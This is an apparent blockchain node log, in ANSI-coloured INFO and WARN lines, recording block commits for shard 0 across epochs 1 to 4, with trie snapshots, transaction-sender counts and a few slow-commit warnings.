[0;32mINFO [0m[2026-10-06 22:05:15.028] [process/block]      [0/1/33/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 33 [0;32mnonce[0m = 31 [0;32mhash[0m = 26ee8731261ba47e54827e21ee512223dbc3d34c6fd4d3fb2b1994b3c3b609b7 
[0;32mINFO [0m[2026-10-06 22:05:19.542] [txsSender]          [0/1/33/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 1 
[0;32mINFO [0m[2026-10-06 22:05:21.020] [process/block]      [0/1/34/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 34 [0;32mnonce[0m = 32 [0;32mhash[0m = fad1e91ddfbe5276917e94129538fb7e0bb4773f7fef1b90670d6b2a09acae4d 
[0;32mINFO [0m[2026-10-06 22:05:27.020] [process/block]      [0/1/35/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 35 [0;32mnonce[0m = 33 [0;32mhash[0m = f5341383ffa39c91eec82579b5ff574f85b51d3ddc580fb8199e0a1536637e12 
[0;32mINFO [0m[2026-10-06 22:05:33.021] [process/block]      [0/1/36/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 36 [0;32mnonce[0m = 34 [0;32mhash[0m = 61ea7b42c995e12be99bd59668db8f48b449216f05ef8a7f5b91a9a9c3b2fd79 
[0;32mINFO [0m[2026-10-06 22:05:39.018] [process/block]      [0/1/37/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 37 [0;32mnonce[0m = 35 [0;32mhash[0m = a3e5c96e7d34fc453e171c92ba4ee5559674951d6d77dd77885fee512599f613 
[0;32mINFO [0m[2026-10-06 22:05:45.017] [process/block]      [0/1/38/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 38 [0;32mnonce[0m = 36 [0;32mhash[0m = cd6646c16b5d7b2f1c881b600412c4921ca59a7b400227a7b8c81bec5a360fc0 
[0;32mINFO [0m[2026-10-06 22:05:51.030] [process/block]      [0/1/39/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 39 [0;32mnonce[0m = 37 [0;32mhash[0m = 85471babb00c8eaed4f1b0863d262b337b72a43c1c0a8c9cb7ec299c8da44da5 
[0;32mINFO [0m[2026-10-06 22:05:57.027] [process/block]      [0/1/40/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 40 [0;32mnonce[0m = 38 [0;32mhash[0m = 3a4c5a6fdc068112bc997093d2145763fd9f979132d6b208b439d18e44d056d6 
[0;32mINFO [0m[2026-10-06 22:06:01.545] [txsSender]          [0/1/40/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 2 
[0;32mINFO [0m[2026-10-06 22:06:03.025] [process/block]      [0/1/41/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 41 [0;32mnonce[0m = 39 [0;32mhash[0m = 7be317ad062b3ee2e48b6f3cac5a5081936ffec302ca083dda1da1182539c5a1 
[0;32mINFO [0m[2026-10-06 22:06:18.006] [process/block]      [0/1/43/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 43 [0;32mnonce[0m = 40 [0;32mhash[0m = 62ade4e48f729a692e13c9707173bf008d42e7337630fe0ad0e8a21ffd695047 
[0;32mINFO [0m[2026-10-06 22:06:21.035] [process/block]      [0/1/44/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 44 [0;32mnonce[0m = 41 [0;32mhash[0m = b24399f37dff235d8252e514d4c6d94dc10a0f6b2dbcb0c3264bea9c1fbc47f3 
[0;32mINFO [0m[2026-10-06 22:06:33.413] [process/block]      [0/1/46/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 45 [0;32mnonce[0m = 42 [0;32mhash[0m = ac6ea7dba63d2ca816bc09e57aa56beda2fc89c311681cf8d6572c5f19410be1 
[0;32mINFO [0m[2026-10-06 22:06:33.420] [process/block]      [0/1/46/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 46 [0;32mnonce[0m = 43 [0;32mhash[0m = 8036e413b7f84717e241205304b6967a6b42372145db3574b49a3fdd8f69d415 
[0;32mINFO [0m[2026-10-06 22:06:39.018] [process/block]      [0/1/47/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 47 [0;32mnonce[0m = 44 [0;32mhash[0m = d433f3c0bdfb6977a790d1d3ba60abf059e18a00f120f0ea3af009c590ffcc1a 
[0;32mINFO [0m[2026-10-06 22:06:43.548] [txsSender]          [0/1/47/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 3 
[0;32mINFO [0m[2026-10-06 22:06:45.026] [process/block]      [0/1/48/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 48 [0;32mnonce[0m = 45 [0;32mhash[0m = 8d284ab63355d3fdc06361b7373d055ea9b0a8b8f7725c20e3db60e136e2cb48 
[0;32mINFO [0m[2026-10-06 22:06:51.028] [process/block]      [0/1/49/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 49 [0;32mnonce[0m = 46 [0;32mhash[0m = cc29082633c650dd24e6a36d6c27b67b25c15c39f5a4284a8efebf8437d83c98 
[0;32mINFO [0m[2026-10-06 22:06:57.022] [process/block]      [0/1/50/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 50 [0;32mnonce[0m = 47 [0;32mhash[0m = f93f78d1b87acffc2b890caf5f53e20d5b9478086b85d7cf1897fdb507127622 
[0;32mINFO [0m[2026-10-06 22:07:06.024] [process/block]      [0/2/51/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 51 [0;32mnonce[0m = 48 [0;32mhash[0m = 754796a81a99a5e8b504cee5e13aa086f9156c4ddc472380caf32c1d1f05c408 
[0;33mWARN [0m[2026-10-06 22:07:06.027] [..nsus/spos/bls/v2] [0/2/51/(END_ROUND)] doEndRoundJobByNode.CommitBlock          [0;33melapsed time[0m = 3.003240708s 
[0;32mINFO [0m[2026-10-06 22:07:09.011] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:09.011] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;33mWARN [0m[2026-10-06 22:07:09.709] [process/block]      [0/2/52/(END_ROUND)] saveShardHeader                          [0;33melapsed time[0m = 687.580917ms 
[0;32mINFO [0m[2026-10-06 22:07:10.949] [process/block]      [0/2/52/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 52 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 
[0;32mINFO [0m[2026-10-06 22:07:10.957] [state]              [0/2/52/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = a518a5c28291a61b129dfd908f2492adb0ac4f9425d9adc0fc072e39a59d2f0f [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:10.971] [process/block]      [0/2/52/(END_ROUND)] supernova transition is ready            [0;32mshard[0m = 0 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 [0;32mepoch[0m = 2 [0;32mround[0m = 52 
[0;32mINFO [0m[2026-10-06 22:07:15.021] [process/block]      [0/2/53/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 53 [0;32mnonce[0m = 50 [0;32mhash[0m = 9e424fc756e7d48ac81bdc19a20824f6b38d2e53626e8475dd85a434399f9038 
[0;32mINFO [0m[2026-10-06 22:07:21.028] [process/block]      [0/2/54/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 54 [0;32mnonce[0m = 51 [0;32mhash[0m = 3538b19ce9ad03d99f8060ef759ea1fa32ac6982c50eda20cd2c67934e5336bc 
[0;32mINFO [0m[2026-10-06 22:07:27.018] [process/block]      [0/2/55/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 55 [0;32mnonce[0m = 52 [0;32mhash[0m = 68ec1297b966cacb680bb988ac42effa38afc9e580d72983b7006489825a80a2 
[0;32mINFO [0m[2026-10-06 22:07:33.015] [process/block]      [0/2/56/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 56 [0;32mnonce[0m = 53 [0;32mhash[0m = 608cd4a284caca7ddf70cb5e0aea914c3aa0fbc605d87601a06f834f221685ec 
[0;32mINFO [0m[2026-10-06 22:07:39.018] [process/block]      [0/2/57/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 57 [0;32mnonce[0m = 54 [0;32mhash[0m = 2131c5a99673d22dce03747566dc2288270ae224aa36d26002e94d843ee62900 
[0;32mINFO [0m[2026-10-06 22:07:45.015] [process/block]      [0/2/58/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 58 [0;32mnonce[0m = 55 [0;32mhash[0m = a68386bda3d914aef78d1a30b51f4f717c75debbf65123a4e1c1a5cf425b9e77 
[0;32mINFO [0m[2026-10-06 22:07:51.017] [process/block]      [0/2/59/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 59 [0;32mnonce[0m = 56 [0;32mhash[0m = 7465bca05cad5d9424100c1425e0d53a0d9b2087a6bd0a4cdae7d949344b615d 
[0;32mINFO [0m[2026-10-06 22:07:57.022] [process/block]      [0/2/60/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 60 [0;32mnonce[0m = 57 [0;32mhash[0m = 57bfb935e64a756d45fb2e73d6172214a9fc6e2389737ecb2b0307c230151a14 
[0;32mINFO [0m[2026-10-06 22:08:03.018] [process/block]      [0/2/61/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 61 [0;32mnonce[0m = 58 [0;32mhash[0m = 71ff11a30aeb99162b207422b686d39d592699393155419997acfe39c561d4ed 
[0;32mINFO [0m[2026-10-06 22:08:09.014] [process/block]      [0/2/62/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 62 [0;32mnonce[0m = 59 [0;32mhash[0m = 34cbab52b6d4fbf1890efdc4074c007fdb3003826d8d16b98d7ba813baff3283 
[0;32mINFO [0m[2026-10-06 22:08:15.020] [process/block]      [0/2/63/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 63 [0;32mnonce[0m = 60 [0;32mhash[0m = 76a498ab7fc288982a6baa46f37d7f03644c420ad3d78be1ab4c8bd19df3417b 
[0;32mINFO [0m[2026-10-06 22:08:21.019] [process/block]      [0/2/64/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 64 [0;32mnonce[0m = 61 [0;32mhash[0m = f29bc614ab9bd58f8296f8dbe120dbe4fe8bbd3dc5dad4447e3252e450d917ec 
[0;32mINFO [0m[2026-10-06 22:08:27.018] [process/block]      [0/2/65/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 65 [0;32mnonce[0m = 62 [0;32mhash[0m = b9391d22672c7a2cb7083724286af774240bb58ac76abd635919365a63ea2b54 
[0;32mINFO [0m[2026-10-06 22:08:33.019] [process/block]      [0/2/66/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 66 [0;32mnonce[0m = 63 [0;32mhash[0m = bbd7c3bc2aafef38f22ba7338751b538de4aeae7118e536abca571f7eabcf462 
[0;32mINFO [0m[2026-10-06 22:08:39.019] [process/block]      [0/2/67/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 67 [0;32mnonce[0m = 64 [0;32mhash[0m = a4ab9a89a9ecd6c5ca3a95d458f27aedf481a75e7317e65d269081be621ba6d8 
[0;32mINFO [0m[2026-10-06 22:08:45.020] [process/block]      [0/2/68/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 68 [0;32mnonce[0m = 65 [0;32mhash[0m = 83cc45fe52ff0e0de000064eb406bf8af0291a3a1c96ea10eaed31d3fce15e89 
[0;32mINFO [0m[2026-10-06 22:08:51.018] [process/block]      [0/2/69/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 69 [0;32mnonce[0m = 66 [0;32mhash[0m = f7cd5d533d860982fd22ad45a10a44aaaaa8c3d318630338217975fc0f107f54 
[0;32mINFO [0m[2026-10-06 22:08:57.013] [process/block]      [0/2/70/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 70 [0;32mnonce[0m = 67 [0;32mhash[0m = 0d49f5ea35b970b6af2479b7f617ac6ba705d0348bbfb5444c60618ed6031b24 
[0;32mINFO [0m[2026-10-06 22:09:03.019] [process/block]      [0/2/71/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 71 [0;32mnonce[0m = 68 [0;32mhash[0m = cab0dddfc0c54296efd10e3a6c768cf65e05a014bc7450a70427319a866926ae 
[0;32mINFO [0m[2026-10-06 22:09:09.017] [process/block]      [0/2/72/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 72 [0;32mnonce[0m = 69 [0;32mhash[0m = 0429c42bc61394cd44582550a68a72aaf0044e68de9923f8a11805294f983902 
[0;32mINFO [0m[2026-10-06 22:09:10.563] [txsSender]          [0/2/72/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 4 
[0;32mINFO [0m[2026-10-06 22:09:15.028] [process/block]      [0/2/73/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 73 [0;32mnonce[0m = 70 [0;32mhash[0m = 56aa8b0eeabdcd5e07003e9e20f023f8a2153d47d2cc8081468675415d717117 
[0;32mINFO [0m[2026-10-06 22:09:24.020] [process/block]      [0/3/74/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 74 [0;32mnonce[0m = 71 [0;32mhash[0m = acc0c67794d94f46df340547791ce1e9da2a46a07c24399227474395832153a2 
[0;32mINFO [0m[2026-10-06 22:09:27.015] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:27.015] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:29.059] [process/block]      [0/3/75/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 75 [0;32mnonce[0m = 72 [0;32mhash[0m = e2f6bf4c84964ab371ac13f754590222a029382e7c4583ce2b1f12d358af2244 
[0;32mINFO [0m[2026-10-06 22:09:29.071] [state]              [0/3/75/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 2c473afb8c885d35d627983af2acb0bae6723a2099552c9bc2fb362441561d56 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:33.023] [process/block]      [0/3/76/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 76 [0;32mnonce[0m = 73 [0;32mhash[0m = 03320edef061391af970a7278631dba85bcb8cdc1976a6d6610b7d77a0e85b0a 
[0;32mINFO [0m[2026-10-06 22:09:39.013] [process/block]      [0/3/77/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 77 [0;32mnonce[0m = 74 [0;32mhash[0m = a9b39869efb6b21d31131ffdf6b10983f3a8a1942fd299473a751ae9c1e8b32b 
[0;32mINFO [0m[2026-10-06 22:09:45.014] [process/block]      [0/3/78/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 78 [0;32mnonce[0m = 75 [0;32mhash[0m = c2df6b76de1588b28b1ec06cfa05c81c3933058b1c97ad9e5652b0dc9bf5ede8 
[0;32mINFO [0m[2026-10-06 22:09:51.023] [process/block]      [0/3/79/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 79 [0;32mnonce[0m = 76 [0;32mhash[0m = 4b0b3a4c9e3a679c8f38420cdf1645ad0da6df5c3be5cfe3d5b531df68908c33 
[0;32mINFO [0m[2026-10-06 22:09:57.019] [process/block]      [0/3/80/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 80 [0;32mnonce[0m = 77 [0;32mhash[0m = c125089cf86db66258ceaeeaaf307831269e6f927984381ba1327d1d2ebd9db7 
[0;32mINFO [0m[2026-10-06 22:10:03.019] [process/block]      [0/3/81/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 81 [0;32mnonce[0m = 78 [0;32mhash[0m = 00a057f4b042c2bef140bfab788d454b12becb77c2f1c00916503d55a857316c 
[0;32mINFO [0m[2026-10-06 22:10:09.016] [process/block]      [0/3/82/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 82 [0;32mnonce[0m = 79 [0;32mhash[0m = 9809702a1e77c948885306d007bc4f808c900a4485f91164c1bffcc92244a18d 
[0;32mINFO [0m[2026-10-06 22:10:15.021] [process/block]      [0/3/83/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 83 [0;32mnonce[0m = 80 [0;32mhash[0m = 8281c2d4b85db434674eddcd06b23edd60f1d8719a1c4e3173a8ece11833494d 
[0;32mINFO [0m[2026-10-06 22:10:21.016] [process/block]      [0/3/84/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 84 [0;32mnonce[0m = 81 [0;32mhash[0m = 7617a76e3ed0a08125d4cc31372fc9faf667ee8781f754882cbc9554c2dc594b 
[0;32mINFO [0m[2026-10-06 22:10:27.024] [process/block]      [0/3/85/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 85 [0;32mnonce[0m = 82 [0;32mhash[0m = 38d25a0e5f43aaf12bf9ccce1fbca5866d05f0942613b579c505dee50bee70f2 
[0;32mINFO [0m[2026-10-06 22:10:33.016] [process/block]      [0/3/86/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 86 [0;32mnonce[0m = 83 [0;32mhash[0m = 6711add0d388374d90aa72cde191e7a85bec19e461635eaf5eb41cb633836db8 
[0;32mINFO [0m[2026-10-06 22:10:39.016] [process/block]      [0/3/87/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 87 [0;32mnonce[0m = 84 [0;32mhash[0m = 7c648ce0ac4bee03dd10c8ed577ecc38fd54b683bf2470b71bf1ca688ae0c7c3 
[0;32mINFO [0m[2026-10-06 22:10:45.020] [process/block]      [0/3/88/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 88 [0;32mnonce[0m = 85 [0;32mhash[0m = 568996efae6f5dd82897a99442f959c7b3524380ac4058c1623ddf9c33cc9d74 
[0;32mINFO [0m[2026-10-06 22:10:51.025] [process/block]      [0/3/89/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 89 [0;32mnonce[0m = 86 [0;32mhash[0m = 8e3efc51d7340a15b9ec97a76e08d2cd8f796df882eb52d49dd2da651b976d93 
[0;32mINFO [0m[2026-10-06 22:10:57.018] [process/block]      [0/3/90/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 90 [0;32mnonce[0m = 87 [0;32mhash[0m = 777f9e331e8bc89ce35caef9ad66833f1c45c85fc833f9ee806e162d9fcbecc8 
[0;32mINFO [0m[2026-10-06 22:11:03.030] [process/block]      [0/3/91/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 91 [0;32mnonce[0m = 88 [0;32mhash[0m = 55cfa49c37fb227c9d6d2a11a7b5f576b3567a577abf1f87866453c10e0cd4b1 
[0;32mINFO [0m[2026-10-06 22:11:09.018] [process/block]      [0/3/92/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 92 [0;32mnonce[0m = 89 [0;32mhash[0m = d840d06c69b5bed70d30771423630c1a2f6c8bfb6f71cac0ec8334647eca1887 
[0;32mINFO [0m[2026-10-06 22:11:15.018] [process/block]      [0/3/93/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 93 [0;32mnonce[0m = 90 [0;32mhash[0m = 01e3691290f4845b1f61e94502fa26842d9524b8563a2b0c2ed2f7225db347eb 
[0;32mINFO [0m[2026-10-06 22:11:21.014] [process/block]      [0/3/94/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 94 [0;32mnonce[0m = 91 [0;32mhash[0m = 982c58e60487a5cfc307f5073005d5fe9859098e729e554e156519ed0382fad8 
[0;32mINFO [0m[2026-10-06 22:11:27.020] [process/block]      [0/3/95/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 95 [0;32mnonce[0m = 92 [0;32mhash[0m = 4bdf0dc4537cc235241a4eba59a1fb1d2610acaa127e06d86b158056fe17ca2e 
[0;32mINFO [0m[2026-10-06 22:11:33.017] [process/block]      [0/3/96/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 96 [0;32mnonce[0m = 93 [0;32mhash[0m = 3786d833a40cceaf8762d7efc194aaad48dbc2612ae4c15e7a23354b61597a3a 
[0;32mINFO [0m[2026-10-06 22:11:39.020] [process/block]      [0/3/97/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 97 [0;32mnonce[0m = 94 [0;32mhash[0m = 46f68051c07ec10a415e34657bbfee9193168c75e248dd61c0995a43352b4cff 
[0;32mINFO [0m[2026-10-06 22:11:45.003] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:45.007] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:47.042] [process/block]      [0/4/98/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 98 [0;32mnonce[0m = 95 [0;32mhash[0m = 2e4ac356ca9669c64a52912eda71d8e7de3da77ae2a806a29b20744ff4631c20 
[0;32mINFO [0m[2026-10-06 22:11:47.042] [state]              [0/4/98/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 7abb6257950623b825e9971cfa6cf0373ea5b58fa0d712636b22661505fb7d59 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:51.025] [process/block]      [0/4/99/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 99 [0;32mnonce[0m = 96 [0;32mhash[0m = 57fbb32eb6f3a9eb5f5623c6b9748eefaebbe036ad07a33c58b22a22a55b144e 
[0;32mINFO [0m[2026-10-06 22:11:57.024] [process/block]      [0/4/100/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 100 [0;32mnonce[0m = 97 [0;32mhash[0m = 8cbcc4cdcb225e5eec1840e30f0006e362e6a30e3eb57bf59ca65bee72c6437a 
[0;32mINFO [0m[2026-10-06 22:12:03.020] [process/block]      [0/4/101/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 101 [0;32mnonce[0m = 98 [0;32mhash[0m = 450e8f4588f2565befa1001767997f32d2f11dd9ce2369e0ff9f22be85003ea5 
[0;32mINFO [0m[2026-10-06 22:12:09.024] [process/block]      [0/4/102/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 102 [0;32mnonce[0m = 99 [0;32mhash[0m = 57b9b6c0a2a6739b3a5c157a947a8cb02691dbd1822ff4e631dcfd39259ef7d1 
[0;32mINFO [0m[2026-10-06 22:12:15.022] [process/block]      [0/4/103/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 103 [0;32mnonce[0m = 100 [0;32mhash[0m = 511179cba9362c163d7feeca9d028c1a4dd6cc45a2515d05989ca0c95671b519 
[0;32mINFO [0m[2026-10-06 22:12:21.024] [process/block]      [0/4/104/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 104 [0;32mnonce[0m = 101 [0;32mhash[0m = 8aa9fea6c45c0ed64ef2c08e8c653c10830f1b1265ca19d8d2766757de7d8e56 
[0;32mINFO [0m[2026-10-06 22:12:27.019] [process/block]      [0/4/105/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 105 [0;32mnonce[0m = 102 [0;32mhash[0m = eaeb13980d6f07abc88a4b4ca4e87df847d29786ed8ee39b1c9720fbf5080b0a 
[0;32mINFO [0m[2026-10-06 22:12:33.018] [process/block]      [0/4/106/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 106 [0;32mnonce[0m = 103 [0;32mhash[0m = 4c5c2cc0f2b18af6ac405c90959097fa478eed25df39874449d4f6ba8cefee70 
[0;32mINFO [0m[2026-10-06 22:12:39.013] [process/block]      [0/4/107/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 107 [0;32mnonce[0m = 104 [0;32mhash[0m = 056af6eaff801fc3a8059f78b8cfd871acc5d4c54dccabb1ae9bfddec4c52a47 
[0;32mINFO [0m[2026-10-06 22:12:45.018] [process/block]      [0/4/108/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 108 [0;32mnonce[0m = 105 [0;32mhash[0m = d6e139f47f3abc2702da50d0529c9e63cbebc9a01758d58d70fc40b3b844153e 
[0;32mINFO [0m[2026-10-06 22:12:51.023] [process/block]      [0/4/109/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 109 [0;32mnonce[0m = 106 [0;32mhash[0m = 823c47fc41a85d6529bbb4178d94a47d28d5955efbc87fc730583bb6d8b80e42 
[0;32mINFO [0m[2026-10-06 22:12:57.022] [process/block]      [0/4/110/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 110 [0;32mnonce[0m = 107 [0;32mhash[0m = 8933812d04ebf44ae0d2a367683c712ec62d998f1ccec32096287b2835009f78 
[0;32mINFO [0m[2026-10-06 22:13:03.019] [process/block]      [0/4/111/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 111 [0;32mnonce[0m = 108 [0;32mhash[0m = 43c2456e4d2d62be12454a14b96b4b13bbe0e74994d3fe6d14260b15d9fb0641 
